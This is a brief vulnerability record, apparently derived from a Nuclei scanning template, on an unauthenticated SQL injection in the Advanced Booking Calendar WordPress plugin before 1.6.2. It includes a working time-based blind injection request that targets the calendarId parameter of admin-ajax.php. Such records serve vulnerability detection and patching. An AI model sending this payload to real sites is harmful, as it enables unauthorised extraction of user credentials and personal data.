# Vulnerability: Advanced Booking Calendar < 1.6.2 - SQL Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`advanced-booking-calendar-sqli.yaml`)

## Description
The AJAX action abc_booking_getBookingResult, available to both authenticated and Unauthenticated users did not sanitise the calendarId parameter which was then concatenated to a SQL statement, leading an unauthenticated SQL injection issue. This could be used to retrieve information from the database, such as users' hashed password, username and email address.

## Secure Mitigation
Fixed in version 1.6.2

## Vulnerable Code Pattern / Exploit Payload
```http
@timeout: 10s
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

calendarId=1)+AND+(SELECT+2065+FROM+(SELECT(SLEEP(6)))jtGw)+AND+(5440=5440&from=2010-05-05&to=2010-05-09&action=abc_booking_getBookingResult
```

